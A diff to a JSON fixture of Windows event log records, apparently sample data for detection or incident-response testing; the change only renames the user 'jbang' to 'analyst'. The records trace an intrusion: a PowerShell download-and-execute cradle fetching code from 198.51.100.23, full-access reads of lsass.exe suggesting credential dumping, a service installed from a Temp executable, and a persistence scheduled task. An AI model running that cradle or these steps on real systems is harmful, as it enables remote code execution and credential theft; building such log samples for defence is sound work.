@@ -1,7 +1,7 @@
 [
   {"EventID": 4104, "Channel": "Microsoft-Windows-PowerShell/Operational", "TimeCreated": "2026-03-15T14:23:00", "ScriptBlockText": "$c=New-Object Net.WebClient; IEX($c.DownloadString('http://198.51.100.23/s'))"},
   {"EventID": 10, "Channel": "Microsoft-Windows-Sysmon/Operational", "TimeCreated": "2026-03-15T14:25:00", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1FFFFF"},
-  {"EventID": 7045, "Channel": "System", "TimeCreated": "2026-03-15T14:25:30", "ServiceName": "RemoteHandsHelper", "ImagePath": "C:\\Users\\jbang\\AppData\\Local\\Temp\\rhh.exe"},
+  {"EventID": 7045, "Channel": "System", "TimeCreated": "2026-03-15T14:25:30", "ServiceName": "RemoteHandsHelper", "ImagePath": "C:\\Users\\analyst\\AppData\\Local\\Temp\\rhh.exe"},
   {"EventID": 4698, "Channel": "Security", "TimeCreated": "2026-03-15T14:22:03", "TaskName": "\\RemoteHandsSync"},
-  {"EventID": 4624, "Channel": "Security", "TimeCreated": "2026-03-15T14:22:00", "TargetUserName": "jbang", "LogonType": 2}
+  {"EventID": 4624, "Channel": "Security", "TimeCreated": "2026-03-15T14:22:00", "TargetUserName": "analyst", "LogonType": 2}
 ]
